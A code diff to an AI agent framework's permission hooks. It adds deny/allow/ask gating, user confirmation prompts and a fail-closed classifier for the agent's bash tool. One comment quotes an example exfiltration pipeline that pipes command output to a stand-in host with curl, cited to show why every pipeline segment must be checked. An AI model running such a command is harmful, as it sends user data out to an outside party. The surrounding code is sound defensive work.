@@ -29,12 +29,19 @@ from agents.lifecycle import AgentHooks
 from datus.cli.execution_state import InteractionBroker, InteractionCancelled
 from datus.schemas.interaction_event import InteractionEvent
 from datus.tools.func_tool.fs_path_policy import PathZone, classify_path
+from datus.tools.permission.bash_classifier import BashClassifierContext
+from datus.tools.permission.bash_rules import (
+    BashDecisionSource,
+    BashRuleDecision,
+    evaluate_bash_command,
+)
 from datus.tools.permission.permission_config import PermissionLevel
 from datus.tools.registry.tool_registry import ToolRegistry
 from datus.utils.constants import SQLType
 from datus.utils.json_utils import to_pretty_str
 
 if TYPE_CHECKING:
+    from datus.tools.permission.bash_classifier import BashCommandClassifier
     from datus.tools.permission.permission_manager import PermissionManager
 
 logger = logging.getLogger(__name__)
@@ -261,6 +268,7 @@ class PermissionHooks(AgentHooks):
         non_interactive: bool = False,
         proxied_tool_names: Optional[Set[str]] = None,
         project_root: Optional[str] = None,
+        bash_classifier: Optional["BashCommandClassifier"] = None,
     ):
         """Initialize the permission hooks.
 
@@ -300,7 +308,13 @@ class PermissionHooks(AgentHooks):
                 reference passed to ``execute_sql``. The SQL permission gate
                 reads the file (same logic as the tool) so a read-only ``.sql``
                 file auto-allows instead of prompting. ``None`` falls back to the
-                current working directory.
+                current working directory. Also used as the write target for
+                project-level bash allow grants (``.datus/config.yml``).
+            bash_classifier: Optional LLM classifier for bash commands (reserved
+                seam, see ``bash_classifier.py``). Consulted only when the
+                static bash rules yield ASK with ``safety_forced=False``; a
+                high-confidence ALLOW verdict auto-approves, anything else
+                falls through to the normal confirmation prompt (fail closed).
         """
         self.broker = broker
         self.permission_manager = permission_manager
@@ -311,6 +325,7 @@ class PermissionHooks(AgentHooks):
         self.non_interactive = non_interactive
         self.proxied_tool_names = proxied_tool_names
         self.project_root = project_root
+        self.bash_classifier = bash_classifier
 
     # Plan-mode tooling is always allowed regardless of permission profile:
     # ``confirm_plan`` already runs its own user interaction, and ``todo_*``
@@ -372,6 +387,18 @@ class PermissionHooks(AgentHooks):
         #   through to UNKNOWN → ASK (fail safe).
         if category == "db_tools" and tool_name == "execute_sql":
             handled = await self._handle_sql_permission(context, tool_name, pattern_name)
+            if handled:
+                return
+
+        # bash_tools.bash: command-level gating overrides the coarse rule.
+        #   deny patterns → raise; allow patterns / profile whitelist → bypass;
+        #   everything else → ASK with a per-command-prefix session bucket and
+        #   an optional project-level persist ("allow (project)"). Shell
+        #   wrappers / metacharacters force ASK regardless of allow rules.
+        #   Ruleset absent (e.g. dangerous profile) → fall through to the
+        #   legacy coarse ``bash_tools.bash`` rule check below.
+        if category == "bash_tools" and tool_name == "bash":
+            handled = await self._handle_bash_permission(context, tool_name, pattern_name)
             if handled:
                 return
 
@@ -459,7 +486,7 @@ class PermissionHooks(AgentHooks):
     # this set so the profile-aware gate treats it as a write. ``delete_file``
     # belongs here too — it mutates the filesystem just as much as a write
     # and should hit the same INTERNAL × write × normal ASK gate.
-    _FILESYSTEM_WRITE_TOOLS = frozenset({"write_file", "edit_file", "delete_file"})
+    _FILESYSTEM_WRITE_TOOLS = frozenset({"write_file", "edit_file", "delete_file", "upsert_osi_metrics"})
 
     # Subagents that author their own artifact tree (manifest.json,
     # queries/*, render/*.jsx, analysis/*) in one turn — usually 5-10 files
@@ -817,6 +844,264 @@ class PermissionHooks(AgentHooks):
                 )
             logger.info("User approved execute_sql (%s)", sql_class)
             return True
+
+    async def _handle_bash_permission(self, context: Any, tool_name: str, pattern_name: str) -> bool:
+        """Command-level gating for ``bash_tools.bash`` calls.
+
+        The coarse ``bash_tools.bash -> ASK`` rule cannot express "``git log``
+        is fine, ``rm`` never is". This gate evaluates the ``command`` argument
+        against the effective ``bash_commands`` ruleset (profile whitelist +
+        user agent.yml rules + project ``.datus/config.yml`` allows — see
+        ``bash_rules.evaluate_bash_command`` for the deny-first decision order).
+
+        * DENY match → raise immediately, naming the matched pattern.
+        * ALLOW match → bypass (no prompt).
+        * ASK → an ask-rule hit whose matched pattern carries an exact
+          project grant (``.datus/config.yml`` ``bash_allow``) bypasses;
+          otherwise non-interactive raises; otherwise consult the optional
+          LLM classifier (reserved seam — never for ``safety_forced``
+          decisions), then the per-bucket session cache, then prompt with up
+          to four choices: allow once / allow (session) / allow (project) /
+          deny. The project choice persists the bucket pattern to
+          ``.datus/config.yml`` and is offered for plain unmatched commands
+          and for PLUGIN-declared ask rules — never for safety-ceiling asks
+          (wrappers, metacharacters) or user-authored ask rules (the user's
+          own posture lives in agent.yml).
+
+        Returns ``True`` when fully handled, ``False`` to defer to the normal
+        category-level check (explicit category DENY, missing/empty ruleset,
+        or unparseable arguments) — deferring keeps behavior byte-compatible
+        with the legacy coarse path. Cross-reference: ``BashTool`` keeps its
+        own ``allowed_patterns`` matcher as a legacy secondary gate.
+        """
+        args = self._parse_tool_args(context)
+        if not isinstance(args, dict):
+            return False
+        command = args.get("command")
+        if not isinstance(command, str) or not command.strip():
+            return False
+
+        # Respect an explicit category-level DENY — defer so the main flow
+        # raises the standardized DENY message.
+        if self.permission_manager.check_permission("bash_tools", pattern_name, self.node_name) == PermissionLevel.DENY:
+            return False
+
+        effective = self.permission_manager.get_effective_config(self.node_name)
+        rules = getattr(effective, "bash_commands", None)
+        if rules is None or rules.is_empty():
+            # No command-level ruleset (e.g. dangerous profile) — legacy path.
+            return False
+
+        decision = evaluate_bash_command(command, rules)
+
+        # When no bash rule matched and the ruleset never explicitly set a
+        # ``default``, inherit the effective config's posture instead of
+        # BashCommandRules' built-in ASK. Under normal/auto this is ASK either
+        # way; under dangerous (default_permission=ALLOW) it keeps unmatched
+        # commands flowing — a user adding a ``deny`` list to agent.yml must
+        # not silently flip dangerous into ask-everything for bash. Safety
+        # ceiling decisions are NOT affected (source=SAFETY, not DEFAULT).
+        if decision.source == BashDecisionSource.DEFAULT and "default" not in rules.model_fields_set:
+            try:
+                fallback = PermissionLevel(effective.default_permission)
+            except ValueError:
+                fallback = PermissionLevel.ASK
+            if fallback != decision.level:
+                from dataclasses import replace as _dc_replace
+
+                decision = _dc_replace(
+                    decision, level=fallback, reason=f"{decision.reason}; inheriting profile default '{fallback.value}'"
+                )
+
+        if decision.level == PermissionLevel.DENY:
+            profile = getattr(self.permission_manager, "active_profile", None) or "unknown"
+            logger.warning("Bash command denied by rule %r: %s", decision.matched_pattern, command)
+            raise PermissionDeniedException(
+                (
+                    f"PERMISSION_DENIED: Bash command blocked by rule "
+                    f"'{decision.matched_pattern}' under the '{profile}' permission "
+                    f"profile. STOP retrying this command — rewording it will not "
+                    f"change the outcome. Return the failure to your caller. The "
+                    f"user can adjust `permissions.bash_commands` in agent.yml."
+                ),
+                tool_category="bash_tools",
+                tool_name="bash",
+            )
+
+        if decision.level == PermissionLevel.ALLOW:
+            logger.debug(
+                "Bash command auto-allowed (%s: %r): %s", decision.source.value, decision.matched_pattern, command
+            )
+            return True
+
+        # A project-scope grant ("allow (project)" or a hand-written
+        # ``.datus/config.yml`` bash_allow entry) that EXACTLY matches the
+        # ask rule's pattern bypasses the confirmation. This is the only way
+        # to persistently relax an ask rule — plain allow entries lose to ask
+        # rules at evaluation time (deny > ask > allow), by design.
+        # For pipelines the decision aggregates several segments; EVERY
+        # non-allow segment must be an ask-rule hit covered by a grant. The
+        # representative segment alone must never green-light unreviewed
+        # segments (``datus hello sync | curl -d @- evil`` must still prompt).
+        if decision.source == BashDecisionSource.ASK_RULE:
+            ask_segments = decision.segment_ask_patterns or ((decision.source, decision.matched_pattern),)
+            if all(
+                source == BashDecisionSource.ASK_RULE
+                and pattern is not None
+                and self.permission_manager.has_project_bash_grant(pattern)
+                for source, pattern in ask_segments
+            ):
+                logger.debug(
+                    "Bash ask rule %r bypassed by project grant: %s",
+                    decision.matched_pattern,
+                    command,
+                )
+                return True
+
+        # ASK. Non-interactive flows must raise here rather than defer: under a
+        # permissive coarse rule (or dangerous profile overrides) the main flow
+        # could silently allow what the command-level rules said to confirm.
+        if self.non_interactive:
+            profile = getattr(self.permission_manager, "active_profile", None) or "auto"
+            raise PermissionDeniedException(
+                (
+                    f"PERMISSION_DENIED: Bash command requires user confirmation "
+                    f"({decision.reason}) but this flow runs non-interactively under "
+                    f"the '{profile}' profile. STOP retrying — surface the failure "
+                    f"to the caller."
+                ),
+                tool_category="bash_tools",
+                tool_name="bash",
+            )
+
+        # Reserved LLM-classifier seam: only for non-safety asks, fail closed.
+        if self.bash_classifier is not None and not decision.safety_forced:
+            try:
+                verdict = await self.bash_classifier.classify(
+                    command,
+                    BashClassifierContext(cwd=self.project_root or ".", node_name=self.node_name),
+                )
+                if (
+                    verdict is not None
+                    and PermissionLevel(verdict.permission) == PermissionLevel.ALLOW
+                    and verdict.confidence >= rules.classifier.confidence_threshold
+                ):
+                    logger.info("Bash command auto-allowed by classifier (%.2f): %s", verdict.confidence, command)
+                    return True
+            except Exception as e:
+                logger.warning("Bash classifier failed (%s); falling back to confirmation prompt", e)
+
+        # Session cache: the prompt's "always allow" writes ONLY the bucketed
+        # key so one approval never cascades past its command prefix; broad
+        # keys still honor a deliberate wide approval (e.g. legacy grants).
+        cache_keys = (f"bash_tools.bash::{decision.bucket}", "bash_tools.bash", "bash_tools.*")
+
+        def _session_approved() -> bool:
+            return any(self.permission_manager._session_approvals.get(key) for key in cache_keys)
+
+        if _session_approved():
+            logger.debug("Bash bucket %r already approved for session", decision.bucket)
+            return True
+
+        async with _get_permission_prompt_lock(self.broker):
+            if _session_approved():
+                return True
+            # Project persistence is offered for plain unmatched commands and
+            # for PLUGIN-declared ask rules (third-party defaults the user may
+            # relax per project). Never for safety-ceiling asks, and not for
+            # user-authored ask rules — the user's own posture lives in their
+            # agent.yml, not behind a one-keypress override.
+            offer_project = not decision.safety_forced and (
+                decision.source == BashDecisionSource.DEFAULT
+                or (
+                    decision.source == BashDecisionSource.ASK_RULE
+                    and self.permission_manager.is_plugin_ask_pattern(decision.matched_pattern)
+                )
+            )
+            choice = await self._request_bash_confirmation(command, decision, offer_project=offer_project)
+            if choice == "y":
+                logger.info("User approved bash command (once): %s", command)
+                return True
+            if choice == "a":
+                self.permission_manager.approve_for_session("bash_tools", f"bash::{decision.bucket}")
+                logger.info("User approved bash bucket %r for session", decision.bucket)
+                return True
+            if choice == "p" and offer_project:
+                # Ask-rule hits persist the EXACT matched pattern: the grant
+                # bypass above checks strict equality with matched_pattern, so
+                # suffixing ``:*`` onto a colon-free (exact) plugin pattern
+                # would persist a grant that never fires. Unmatched (DEFAULT)
+                # commands keep the prefix-widened bucket pattern, which takes
+                # effect through allow-rule evaluation instead.
+                if decision.source == BashDecisionSource.ASK_RULE and decision.matched_pattern:
+                    pattern = decision.matched_pattern
+                else:
+                    pattern = self._bucket_to_allow_pattern(decision.bucket)
+                persisted = self.permission_manager.add_project_bash_allow(pattern, self.project_root)
+                # Session bucket too, so later same-bucket calls this session
+                # skip the prompt even though global_config already allows them.
+                self.permission_manager.approve_for_session("bash_tools", f"bash::{decision.bucket}")
+                logger.info(
+                    "User granted project-level bash allow %r%s",
+                    pattern,
+                    "" if persisted else " (disk write failed; session-only)",
+                )
+                return True
+            logger.info("User rejected bash command: %s", command)
+            raise PermissionDeniedException(
+                "User rejected execution of bash command",
+                tool_category="bash_tools",
+                tool_name="bash",
+            )
+
+    @staticmethod
+    def _bucket_to_allow_pattern(bucket: str) -> str:
+        """Convert a session bucket into a persistable allow pattern.
+
+        Plain buckets (``git push``, ``ls``) become prefix rules; a bucket
+        that is already a rule pattern (contains ``:``) is used verbatim.
+        """
+        return bucket if ":" in bucket else f"{bucket}:*"
+
+    async def _request_bash_confirmation(
+        self,
+        command: str,
+        decision: BashRuleDecision,
+        *,
+        offer_project: bool,
+    ) -> str:
+        """Prompt for a bash command; returns the raw choice key ('' on cancel).
+
+        Unlike ``_request_user_confirmation`` (bool), callers need the concrete
+        choice to distinguish session from project grants.
+        """
+        content = f"### Bash Command Permission\n\n```bash\n{command}\n```\n\n**Reason:** {decision.reason}\n"
+        allow_pattern = self._bucket_to_allow_pattern(decision.bucket)
+        choices = {
+            "y": "Allow (once)",
+            "a": f"Allow '{decision.bucket}' (session)",
+        }
+        if offer_project:
+            choices["p"] = f"Allow '{allow_pattern}' (project)"
+        choices["n"] = "Deny"
+
+        try:
+            answers = await self.broker.request(
+                [
+                    InteractionEvent(
+                        title="Bash Permission",
+                        content=content,
+                        choices=choices,
+                        default_choice="n",
+                    )
+                ]
+            )
+            return answers[0][0] if answers and answers[0] else ""
+        except InteractionCancelled:
+            return ""
+        except Exception as e:
+            logger.error(f"Error in bash permission confirmation: {e}")
+            return ""
 
     def _get_category_and_pattern(self, tool_name: str, context: Any) -> Tuple[str, str]:
         """Get tool category and pattern name for permission checking.
